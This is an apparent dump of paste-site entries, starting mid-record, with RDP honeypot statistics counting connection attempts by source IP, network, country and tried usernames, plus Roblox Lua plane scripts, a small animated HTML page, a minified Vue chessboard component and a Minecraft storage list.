    ""AS267784"": 20,
    ""AS396073"": 2,
    ""AS34088"": 12,
    ""AS398324"": 4,
    ""AS56046"": 4,
    ""AS48721"": 8,
    ""AS4134"": 6,
    ""AS174"": 2,
    ""AS24560"": 6,
    ""AS396982"": 24,
    ""AS57523"": 8,
    ""AS197414"": 4,
    ""AS37963"": 4,
    ""AS208091"": 10,
    ""AS135377"": 2,
    ""AS59425"": 8,
    ""AS7713"": 2,
    ""AS14061"": 14,
    ""AS44066"": 4,
    ""AS45899"": 2,
    ""AS9808"": 104,
    ""AS197540"": 40,
    ""AS209711"": 4,
    ""AS49434"": 4
  },
  ""isp"": {
    ""Flyservers S.A."": 28,
    ""Majestic Hosting Solutions, LLC"": 2,
    ""Host Europe GmbH"": 12,
    ""Censys, Inc."": 4,
    ""China Mobile Communications Corporation"": 4,
    ""Chinanet"": 6,
    ""Cogent Communications"": 2,
    ""BHARTI"": 6,
    ""Google LLC"": 24,
    ""Chang Way Technologies Co. Limited"": 8,
    ""Xhost Internet Solutions LP"": 14,
    ""Hangzhou Alibaba Advertising Co"": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Horizon LLC"": 8,
    ""PT Telekomunikasi Indonesia"": 2,
    ""DigitalOcean, LLC"": 14,
    ""www.accelerated.de"": 4,
    ""VietNam Post and Telecom Corporation"": 2,
    ""China Mobile"": 104,
    ""netcup GmbH"": 40,
    ""MUV Bilisim ve Telekomunikasyon Hizmetleri Ltd. Sti"": 4,
    ""Datacenter location PAR1 France"": 4
  },
  ""org"": {
    ""UAB Host Baltic"": 20,
    ""Majestic Hosting Solutions, LLC"": 2,
    ""Go Daddy Netherlands B.V"": 12,
    ""Censys Inc"": 2,
    ""China Mobile Communications Corporation"": 108,
    ""Flyservers S.A"": 8,
    ""Chinanet JS"": 6,
    ""SHODAN, LLC"": 2,
    ""ABTS AP"": 6,
    ""Palo Alto Networks, Inc"": 24,
    ""Chang Way Technologies Co. Limited"": 2,
    ""Xhostis"": 4,
    ""Aliyun Computing Co., LTD"": 4,
    ""Xhost Internet Solutions"": 10,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Starcrecium Limited"": 6,
    ""Horizon LLC"": 8,
    ""Telekomunikasi Indonesia"": 2,
    ""DigitalOcean, LLC"": 14,
    ""diva-e Datacenters GmbH"": 4,
    ""Vietnam Posts and Telecommunications Group"": 2,
    ""Censys, Inc"": 2,
    ""netcup GmbH"": 40,
    ""MUVHost - Vodafone Tuzla"": 4,
    ""ThinkTech Technology Industrial CO. Limited"": 4
  },
  ""regionName"": {
    ""Vilnius"": 20,
    ""Texas"": 4,
    ""Hauts-de-France"": 12,
    ""Illinois"": 2,
    ""Jiangsu"": 10,
    ""Kaunas"": 8,
    ""Telangana"": 6,
    ""California"": 24,
    ""Moscow"": 16,
    ""North Holland"": 14,
    ""Beijing"": 4,
    ""Kowloon"": 2,
    ""Jakarta"": 2,
    ""Karnataka"": 6,
    ""Hesse"": 4,
    ""Hanoi"": 2,
    ""South West"": 2,
    ""Guangdong"": 104,
    ""Central Singapore"": 6,
    ""Michigan"": 2,
    ""Bavaria"": 40,
    ""Istanbul"": 4,
    ""\u00cele-de-France"": 4
  },
  ""country"": {
    ""Lithuania"": 28,
    ""United States"": 32,
    ""France"": 16,
    ""China"": 118,
    ""India"": 12,
    ""Russia"": 16,
    ""The Netherlands"": 14,
    ""Hong Kong"": 2,
    ""Indonesia"": 2,
    ""Germany"": 44,
    ""Vietnam"": 2,
    ""Singapore"": 8,
    ""Turkey"": 4
  },
  ""account"": {
    ""Test"": 30,
    ""hello"": 194,
    ""(empty)"": 8,
    ""root"": 2,
    ""axfYszpEe"": 2,
    ""hSuCHH"": 2,
    ""onlgaX"": 2,
    ""Administr"": 18,
    ""Domain"": 20,
    ""Administrator"": 2,
    ""JWwPwFjIg"": 2,
    ""auXijw"": 2,
    ""xcCPvl"": 2,
    ""fdyModCDA"": 2,
    ""QvaGrR"": 2,
    ""ZKQlUs"": 2,
    ""YNPiHdULt"": 2,
    ""EJPVQZ"": 2,
    ""JoLEiN"": 2
  },
  ""keyboard"": {
    ""Unknown"": 298
  },
  ""client_build"": {
    ""Unknown"": 298
  },
  ""client_name"": {
    ""Unknown"": 298
  },
  ""ip_type"": {
    ""Unknown"": 76,
    ""hosting"": 106,
    ""mobile"": 108,
    ""proxy"": 8
  }
}"
cYh7yBH6,2024-04-12_stats.json,rdp_snitch,JSON,Friday 12th of April 2024 07:15:07 PM CDT,"{
  ""ip"": {
    ""45.227.254.8"": 5,
    ""198.135.49.131"": 1,
    ""151.106.40.212"": 6,
    ""206.168.34.126"": 1,
    ""112.4.139.162"": 2,
    ""194.165.16.10"": 2,
    ""58.218.204.183"": 3,
    ""207.90.244.3"": 1,
    ""122.169.207.168"": 3,
    ""198.235.24.106"": 3,
    ""188.119.66.112"": 1,
    ""45.227.254.9"": 3,
    ""185.170.144.3"": 2,
    ""123.56.20.194"": 2,
    ""87.251.75.120"": 2,
    ""118.193.40.191"": 1,
    ""87.251.75.145"": 3,
    ""185.81.68.38"": 3,
    ""198.235.24.58"": 3,
    ""194.165.16.72"": 2,
    ""62.204.41.225"": 4,
    ""36.91.222.100"": 1,
    ""159.65.147.191"": 3,
    ""84.201.2.2"": 2,
    ""113.160.91.206"": 1,
    ""159.223.85.212"": 1,
    ""36.137.3.251"": 52,
    ""198.235.24.198"": 3,
    ""128.199.225.179"": 3,
    ""167.94.138.33"": 1,
    ""93.177.66.5"": 20,
    ""193.53.245.249"": 2,
    ""91.238.181.16"": 2,
    ""205.210.31.185"": 3,
    ""45.227.254.54"": 2
  },
  ""asn"": {
    ""AS267784"": 10,
    ""AS396073"": 1,
    ""AS34088"": 6,
    ""AS398324"": 2,
    ""AS56046"": 2,
    ""AS48721"": 4,
    ""AS4134"": 3,
    ""AS174"": 1,
    ""AS24560"": 3,
    ""AS396982"": 12,
    ""AS57523"": 4,
    ""AS197414"": 2,
    ""AS37963"": 2,
    ""AS208091"": 5,
    ""AS135377"": 1,
    ""AS59425"": 4,
    ""AS7713"": 1,
    ""AS14061"": 7,
    ""AS44066"": 2,
    ""AS45899"": 1,
    ""AS9808"": 52,
    ""AS197540"": 20,
    ""AS209711"": 2,
    ""AS49434"": 2
  },
  ""isp"": {
    ""Flyservers S.A."": 14,
    ""Majestic Hosting Solutions, LLC"": 1,
    ""Host Europe GmbH"": 6,
    ""Censys, Inc."": 2,
    ""China Mobile Communications Corporation"": 2,
    ""Chinanet"": 3,
    ""Cogent Communications"": 1,
    ""BHARTI"": 3,
    ""Google LLC"": 12,
    ""Chang Way Technologies Co. Limited"": 4,
    ""Xhost Internet Solutions LP"": 7,
    ""Hangzhou Alibaba Advertising Co"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Horizon LLC"": 4,
    ""PT Telekomunikasi Indonesia"": 1,
    ""DigitalOcean, LLC"": 7,
    ""www.accelerated.de"": 2,
    ""VietNam Post and Telecom Corporation"": 1,
    ""China Mobile"": 52,
    ""netcup GmbH"": 20,
    ""MUV Bilisim ve Telekomunikasyon Hizmetleri Ltd. Sti"": 2,
    ""Datacenter location PAR1 France"": 2
  },
  ""org"": {
    ""UAB Host Baltic"": 10,
    ""Majestic Hosting Solutions, LLC"": 1,
    ""Go Daddy Netherlands B.V"": 6,
    ""Censys Inc"": 1,
    ""China Mobile Communications Corporation"": 54,
    ""Flyservers S.A"": 4,
    ""Chinanet JS"": 3,
    ""SHODAN, LLC"": 1,
    ""ABTS AP"": 3,
    ""Palo Alto Networks, Inc"": 12,
    ""Chang Way Technologies Co. Limited"": 1,
    ""Xhostis"": 2,
    ""Aliyun Computing Co., LTD"": 2,
    ""Xhost Internet Solutions"": 5,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Starcrecium Limited"": 3,
    ""Horizon LLC"": 4,
    ""Telekomunikasi Indonesia"": 1,
    ""DigitalOcean, LLC"": 7,
    ""diva-e Datacenters GmbH"": 2,
    ""Vietnam Posts and Telecommunications Group"": 1,
    ""Censys, Inc"": 1,
    ""netcup GmbH"": 20,
    ""MUVHost - Vodafone Tuzla"": 2,
    ""ThinkTech Technology Industrial CO. Limited"": 2
  },
  ""regionName"": {
    ""Vilnius"": 10,
    ""Texas"": 2,
    ""Hauts-de-France"": 6,
    ""Illinois"": 1,
    ""Jiangsu"": 5,
    ""Kaunas"": 4,
    ""Telangana"": 3,
    ""California"": 12,
    ""Moscow"": 8,
    ""North Holland"": 7,
    ""Beijing"": 2,
    ""Kowloon"": 1,
    ""Jakarta"": 1,
    ""Karnataka"": 3,
    ""Hesse"": 2,
    ""Hanoi"": 1,
    ""South West"": 1,
    ""Guangdong"": 52,
    ""Central Singapore"": 3,
    ""Michigan"": 1,
    ""Bavaria"": 20,
    ""Istanbul"": 2,
    ""\u00cele-de-France"": 2
  },
  ""country"": {
    ""Lithuania"": 14,
    ""United States"": 16,
    ""France"": 8,
    ""China"": 59,
    ""India"": 6,
    ""Russia"": 8,
    ""The Netherlands"": 7,
    ""Hong Kong"": 1,
    ""Indonesia"": 1,
    ""Germany"": 22,
    ""Vietnam"": 1,
    ""Singapore"": 4,
    ""Turkey"": 2
  },
  ""account"": {
    ""Test"": 15,
    ""hello"": 97,
    ""(empty)"": 4,
    ""root"": 1,
    ""axfYszpEe"": 1,
    ""hSuCHH"": 1,
    ""onlgaX"": 1,
    ""Administr"": 9,
    ""Domain"": 10,
    ""Administrator"": 1,
    ""JWwPwFjIg"": 1,
    ""auXijw"": 1,
    ""xcCPvl"": 1,
    ""fdyModCDA"": 1,
    ""QvaGrR"": 1,
    ""ZKQlUs"": 1,
    ""YNPiHdULt"": 1,
    ""EJPVQZ"": 1,
    ""JoLEiN"": 1
  },
  ""keyboard"": {
    ""Unknown"": 149
  },
  ""client_build"": {
    ""Unknown"": 149
  },
  ""client_name"": {
    ""Unknown"": 149
  },
  ""ip_type"": {
    ""Unknown"": 38,
    ""hosting"": 53,
    ""mobile"": 54,
    ""proxy"": 4
  }
}"
KLWjsqmN,PlaneLoc,SimTek,Lua,Friday 12th of April 2024 06:39:24 PM CDT,"local players = game:GetService(""Players"")
local player = players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local hrp = char:WaitForChild(""HumanoidRootPart"")
local planeSnd = script:WaitForChild(""PlaneSnd"")
local plane = workspace:FindFirstChild(""Plane"")

local cutOff = 170

local function checkTheZone()
	if not plane then
		return
	end
	planeSnd:Play()
	while plane and hrp do
		local planeRootPart = plane:WaitForChild(""PlaneBase"")
		local sndPos = planeRootPart.Position
		local dist = (hrp.Position - sndPos).Magnitude
		if dist > cutOff then
			wait(1)
			planeSnd:Stop()
			break
		else
			local vol = (1 - dist/cutOff)/2
			planeSnd.Volume = vol
			wait(.1)
		end
	end
	
end

checkTheZone()"
efNFuuUx,Fly,SimTek,Lua,Friday 12th of April 2024 06:35:42 PM CDT,"local plane = script.Parent
local rootPart = plane.PlaneBase
local lv = rootPart.LinearVelocity
lv.MaxForce = math.huge

local startPnt = Vector3.new(0, 200, 1000)
local finishPnt = Vector3.new(0, 200, -1000)

plane:PivotTo(CFrame.new(startPnt))

for i=0, 25, 1 do
	wait(1)
	lv.VectorVelocity = (finishPnt - startPnt).Unit * (5*i)
end
wait(2)
for i, v in pairs(plane:GetDescendants()) do
	if v:IsA(""BasePart"") then
		v.CanCollide = false
	end
end
wait(3)
plane:Destroy()
"
ZtxanEdb,Untitled,Masjo,HTML,Friday 12th of April 2024 06:32:58 PM CDT,"Wait...
Espere..."
1ffMTPwX,Untitled,Masjo,HTML,Friday 12th of April 2024 06:31:25 PM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
<meta charset=""UTF-8"">
<meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
<title>Texto en movimiento</title>
<style>
  .moving-text {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    animation: moveText 4s linear infinite;
  }

  @keyframes moveText {
    0% {
      transform: translate(-50%, -50%) translateX(-100%);
    }
    100% {
      transform: translate(-50%, -50%) translateX(100%);
    }
  }
</style>
</head>
<body>
<div class=""moving-text"">COMPLETED</div>
</body>
</html>"
UJx3q4Gv,Untitled,loloof64,JavaScript,Friday 12th of April 2024 05:50:46 PM CDT,"import { defineComponent as y, useCssVars as S, computed as r, ref as g, openBlock as e, createElementBlock as o, createElementVNode as i, Fragment as a, renderList as u, toDisplayString as p, normalizeClass as V, pushScopeId as x, popScopeId as z } from ""vue"";
const _ = (t) => (x(""data-v-f3751c6b""), t = t(), z(), t), $ = { class: ""lowest-layer"" }, w = /* @__PURE__ */ _(() => /* @__PURE__ */ i(""div"", null, null, -1)), A = {
  key: 0,
  class: ""coordinate""
}, I = { key: 1 }, B = /* @__PURE__ */ _(() => /* @__PURE__ */ i(""div"", null, null, -1)), E = {
  key: 0,
  class: ""coordinate""
}, j = { key: 1 }, D = {
  key: 2,
  class: ""coordinate""
}, F = { key: 3 }, L = /* @__PURE__ */ _(() => /* @__PURE__ */ i(""div"", null, null, -1)), N = {
  key: 0,
  class: ""coordinate""
}, O = { key: 1 }, T = /* @__PURE__ */ _(() => /* @__PURE__ */ i(""div"", null, null, -1)), q = /* @__PURE__ */ y({
  __name: ""ChessboardVue"",
  props: {
    size: { default: 100 },
    reversed: { type: Boolean, default: !1 },
    background: { default: ""#124589"" },
    coordinatesVisible: { type: Boolean, default: !0 },
    coordinatesColor: { default: ""yellow"" },
    whiteCellsColor: { default: ""navajowhite"" },
    blackCellsColor: { default: ""peru"" }
  },
  setup(t) {
    S((d) => ({
      ""48ba1e3a"": C.value,
      81291066: d.background,
      ""4253e682"": f.value,
      ""412df85c"": d.whiteCellsColor,
      ""1fc52e9c"": d.blackCellsColor,
      ec184162: v.value,
      ""1c2d7987"": d.coordinatesColor
    }));
    const l = t, s = r(() => l.size / 9), c = r(() => s.value * 0.5), v = r(() => `${s.value * 0.3}px`), C = r(() => `${l.size}px`), f = r(
      () => `${c.value}px repeat(8, ${s.value}px) ${c.value}px / ${c.value}px repeat(8, ${s.value}px) ${c.value}px`
    ), m = g(), h = r(
      () => l.reversed ? [7, 6, 5, 4, 3, 2, 1, 0] : [0, 1, 2, 3, 4, 5, 6, 7]
    ), b = r(
      () => l.reversed ? [0, 1, 2, 3, 4, 5, 6, 7] : [7, 6, 5, 4, 3, 2, 1, 0]
    );
    return (d, J) => (e(), o(""div"", {
      class: ""root"",
      ref_key: ""rootElement"",
      ref: m
    }, [
      i(""div"", $, [
        w,
        (e(!0), o(a, null, u(h.value, (n) => (e(), o(a, null, [
          l.coordinatesVisible ? (e(), o(""p"", A, p(String.fromCharCode(65 + n)), 1)) : (e(), o(""div"", I))
        ], 64))), 256)),
        B,
        (e(!0), o(a, null, u(b.value, (n) => (e(), o(a, null, [
          l.coordinatesVisible ? (e(), o(""p"", E, p(String.fromCharCode(49 + n)), 1)) : (e(), o(""div"", j)),
          (e(!0), o(a, null, u(h.value, (k) => (e(), o(""div"", {
            class: V([""cell"", (n + k) % 2 !== 0 ? ""white"" : ""black""])
          }, null, 2))), 256)),
          l.coordinatesVisible ? (e(), o(""p"", D, p(String.fromCharCode(49 + n)), 1)) : (e(), o(""div"", F))
        ], 64))), 256)),
        L,
        (e(!0), o(a, null, u(h.value, (n) => (e(), o(a, null, [
          l.coordinatesVisible ? (e(), o(""p"", N, p(String.fromCharCode(65 + n)), 1)) : (e(), o(""div"", O))
        ], 64))), 256)),
        T
      ])
    ], 512));
  }
}), G = (t, l) => {
  const s = t.__vccOpts || t;
  for (const [c, v] of l)
    s[c] = v;
  return s;
}, H = /* @__PURE__ */ G(q, [[""__scopeId"", ""data-v-f3751c6b""]]), M = {
  install(t) {
    t.component(""ChessboardVue"", H);
  }
};
export {
  M as default
};
"
MjbHZPuP,Minecraft Storage Room Organization,Joefazza,Python,Friday 12th of April 2024 04:28:06 PM CDT,"Section 1:
Dirt
Dirt Variants
Gravel & Flint
Sand
Red Sand & Glass

Section 2:
Andesite
Diorite
Granite
Terracotta
Clay & Bricks

Section 3:
Cobble
Cobble Variants
Cobble Deepslate
Deepslate Variants
Tuff

Section 4:
Dripstone & Moss
Amethyst
Smooth Basalt & Calcite
Deep Dark
Adventure

Section 5:
Acacia
Birch
Oak
Dark Oak
Jungle

Section 6:
Spruce
Mangrove
Cherry
Crimson
Warped

Section 7:
Bamboo
Bees
Wool
Pigs, Rabbits, & Sheep
Fish & Grain

Section 8:
Chickens
Cows
Apples & Carrots
Potatoes, Pumpkins, & Melons
Food Other

Section 9:
Flowers & Plants
Inks & Dyes
Paper, Books, Sticks
Enchanted Books
Potions

Section 10:
Redstone & Lapis
Redstone Components
Redstone Accessories
Copper
Shiny

Section 11:
Netherrack
Nether Bricks
Blackstone
Basalt
Obsidian & Nether Quartz

Section 12:
Soul, Glowstone, & Magma
Discs
End Stone & Elytra
Purpur & Chorus
End Other

Section 13:
Ice & Snow
Kelp
Ocean Monument
Coral Reef
Archeology

Section 14:
Villager
Home Décor
Leather, Iron, & Gold Armor
Diamond & Netherite Armor
Wolf & Horse Armor

Section 15:
Trims & Upgrades
Weapons
Tools
Temp Chest 1
Temp Chest 2

Section 16:
Zombies & Spiders
Skeletons & Endermen
Slimes, Phantoms, & Ghasts
Creepers, Breezes, & Blazes
Heads & Misc."
